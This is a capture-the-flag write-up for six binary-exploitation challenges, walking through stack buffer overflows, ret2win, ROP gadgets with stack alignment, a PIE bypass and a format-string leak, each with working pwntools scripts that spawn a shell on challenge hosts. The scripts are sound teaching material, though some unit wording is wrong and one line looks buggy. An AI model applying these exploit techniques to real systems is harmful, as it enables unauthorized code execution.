# PWN

## Tools

 - `pwntools`
 - https://github.com/pwndbg/pwndbg/
 - https://github.com/JonathanSalwan/ROPgadget
 - https://github.com/hugsy/gef

## 1

In the *C code* we have a *buffer* of `0x100` bytes (256 bytes) and we have a call of `gets` function on this buffer. So we have the vulnerabilty, we can try to exploit it but the payload don't work. Analyze the *code object* (*binary executable*) with *ghidra* and in the assembly we see `sub rsp, 0x110`, so the C compiler add some bytes, it's necessary to add 16 characters to exploit the vulnerability.

The value is stocked in 4 bytes, so the offset is `256 + 16 - 4`, after that we can overwrite memory with `0x1337` to get the *shell*.

With *pwntools*:

```python
from pwn import *
c = process("pwnme")
c.sendline(b"a" * 268 + p32(0x1337))
c.interactive()
```

```python
from pwn import *
c = remote("0.cloud.chals.io", 19595)
c.sendline(b"a" * 268 + p32(0x1337))
c.interactive()
```

## 2

In the *C code* we have a `win` function, this function make a shell, so if we can call it we get the flag.

To do this, we use the `rip` register. The `rip` *register* on *x86-64* is a special-purpose register that always holds the *memory address* of the next *instruction* to execute in the *program's code segment*.

In the assembly we can read: `lea ebp, 0x3f`, this is the offset before `ebp` register (written on 4 bytes), so the full offset is `0x3f + 4`, to get a full payload we should add the `win` address. We can get the `win` address with `nm pwnme | grep win`.

So the python code with *pwntools* can be:

```python
from pwn import *
c = process("pwnme")
c.sendline(b"a" * 67 + p32(0x080491d6))
c.interactive()
```

```python
from pwn import *
c = remote("0.cloud.chals.io", 22209)
c.sendline(b"a" * 67 + p32(0x080491d6))
c.interactive()
```

## 3

The C code is the same than the precedent but with an argument passed to the win function, this argument should be `0xdeadbeef` to get the shell. We are in 32 bytes code object, arguments is passed on the stack. So we need to add 3 values on the stack: `win` address in `eip` register, the `eip` for the `win` function and the argument value.

```python
from pwn import *
c = process("/media/kali/Downloads/pwnme")
c.sendline(b"a" * 36 + p32(0x080491d6) + p32(0x080491d6) + p32(0xdeadbeef))
c.interactive()
```

```python
from pwn import *
c = remote("0.cloud.chals.io", 28949)
c.sendline(b"a" * 36 + p32(0x080491d6) + p32(0x080491d6) + p32(0xdeadbeef))
c.interactive()
```

## 4

This time we don't have the *C code*, so we can use *ghidra* to read instructions and get a C code:

```c
void vuln() {
  char buffer[32];
  gets(buffer);
}

void win(uint param_1) {
  if (param_1 == 0xdeadbeef) {
    system("/bin/sh");
  }
  else {
    puts("Almost...");
  }
}
```

The difference is we are in 64 bytes program, to pass an argument we need to use the `rdi` register. So we should find a `pop rdi` instruction followed by `ret` to get the shell. We will add the argument's value in the stack, use the `pop rdi` to put the value in the `rdi` register and call the `win` function. We can use a tool named: `ROPgadget`, like this:

```bash
ROPgadget --binary /media/kali/Downloads/pwnme | grep "pop rdi"
```

We write a payload and it crash, it's because the *system* is not aligned (the *system* address don't end with `0` but with `8`, address is 8 bytes long so address end with `0` or `8`). To align the function address we can add an instruction, we will add a `ret` instruction.

To debug we can use *gdb* like this:

```gdb
(gdb) run < <(printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@\x12S\xde\xad\xbe\xef@\x11v")
```

To generate the payload:

```bash
python3 -c "from pwn import *; print(b'a' * 40 + p64(0x401253) + p64(0xdeadbeef) + p64(0x401176))"
```

Here is the python code to exploit the vulnerabilty and get the shell:

```python
from pwn import *
# c = process("/media/kali/Downloads/pwnme")
elf = ELF("/media/kali/Downloads/pwnme")      # get informations about the ELF file
"""
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled                      # shellcode not possible
    PIE:      No PIE (0x400000)
"""
c = remote("0.cloud.chals.io", 10711)
c.sendline(b"a" * 40 + p64(0x401253) + p64(0xdeadbeef) + p64(0x40101a) + p64(0x401176))
c.interactive()
```

Other python code to exploit the vulnerabilty and get the shell:

```python
from pwn import *

p = process("/media/kali/Downloads/pwnme")
elf = ELF("/media/kali/Downloads/pwnme")
rop = ROP(elf)

rop.raw(rop.find_gadget(['pop rdi', 'ret']).address)
rop.raw(0xdeadbeef)
rop.raw(elf.sym['win']) # ou elf.functions['win'].address

print(rop.dump())

p.sendline(flat({0x28: rop}))
p.interactive()
```

```python
from pwn import *

p = process("/media/kali/Downloads/pwnme")
elf = ELF("/media/kali/Downloads/pwnme")
rop = ROP(elf)

rop(rdi=0xdeadbeef)
rop.raw(elf.sym['win']) # ou elf.functions['win'].address

print(rop.dump())

p.sendline(flat({0x28: rop}))
p.interactive()
```

```python
from pwn import *

p = remote("0.cloud.chals.io", 10711)
context.binary = elf = ELF("/media/kali/Downloads/pwnme(1)")
# p = elf.process()
rop = ROP(elf)

rop.raw(rop.find_gadget(['ret']).address)
rop.win(0xdeadbeef)

print(rop.dump())

p.sendline(flat({0x28: rop}))
p.interactive()
```

## 5

Is this challenge we have the `PIE` activated, so we can't know the addresses before execution. But the *win address* is printed, we can calculate the random offset generated by `PIE` with the difference between the `win` address in the code object and the `win` address at the execution.

We need to read the output, parse it and get the integer from the hexadecimal string. We can use `pwntools` te recalculate all of the address with the `PIE` random offset, so we can use the same payload than the precedent challenge.

```python
from pwn import *

context.binary = elf = ELF("/media/kali/Downloads/pwnme")
c = elf.process()                               # How about reading a leak? 0x557d98b9822e
# c = remote("0.cloud.chals.io", 22287)
c.recvuntil(b'How about reading a leak? ')
elf.address = int(c.recvline().strip().decode(), 16) - elf.sym['win']
rop = ROP(elf)

c.sendline(b"a" * 40 + p64(rop.find_gadget(['pop rdi', 'ret']).address) + p64(0xdeadbeef) + p64(rop.find_gadget(['ret']).address) + p64(elf(elf.sym['win'])))
c.interactive()
```

## 6

Format string vulnerability: the last element in the stack is the address function and the C code is:

```c
undefined8 main(EVP_PKEY_CTX *param_1) {
  char buffer [24];
  code *local_10;

  init(param_1);
  local_10 = win;
  printf("How about creating a leak?");
  gets(buffer);
  printf(buffer);
  vuln();
  return 0;
}
```

So, we change the value of `buffer` and it's the first argument of `printf`. The `printf` function use the first argument to know the number of argument it should use, so i pass `%p%p%p%p%p%p%p%p %p ` (or `%9$p` to print only the address on the last element in the stack (the *win* address)) to get the pointer of the last element on the stack (first 8 arguments come from registers in 64 bits).

```python
from pwn import *

context.binary = elf = ELF("/media/kali/Downloads/pwnme")
c = elf.process()
# gdb.attach(c)
# c = remote("0.cloud.chals.io", 22287)
c.sendline(b'%p%p%p%p%p%p%p%p %p ')
c.recvuntil(b'?')
c.recvuntil(b' ')
elf.address = int(c.recvuntil(b' ').strip().decode(), 16) - elf.sym['win']
rop = ROP(elf)

c.sendline(b"a" * 40 + p64(rop.find_gadget(['pop rdi', 'ret']).address) + p64(0xdeadbeef) + p64(rop.find_gadget(['ret']).address) + p64((elf.sym['win'])))
c.interactive()
```

```python
from pwn import *

context.binary = elf = ELF("/media/kali/Downloads/pwnme")
c = elf.process()
# gdb.attach(c)
# c = remote("0.cloud.chals.io", 22287)
c.recvuntil(b'?')
c.sendline(b'%9$p ')

elf.address = int(c.recvuntil(b' ').strip().decode(), 16) - elf.sym['win']
rop = ROP(elf)

c.sendline(b"a" * 40 + p64(rop.find_gadget(['pop rdi', 'ret']).address) + p64(0xdeadbeef) + p64(rop.find_gadget(['ret']).address) + p64((elf.sym['win'])))
c.interactive()
```

or write-ups:
 - https://github.com/d4rkc0de-club/bluehensCTF-writeups/blob/main/pwn/pwn6/solve.py
 - https://github.com/AndyNovo/UDCTF22/blob/master/pwn/pwn6/exploit.py
 - https://gist.github.com/larsw/1e90ed42c674828f77e72303babb6d1b
 - https://github.com/12throckyou/ctf-writeups/blob/main/bluehens2022/pwn/Intro6/solve.py
 - https://github.com/d4rkc0de-club/bluehensCTF-writeups/blob/main/pwn/pwn6/solve.py
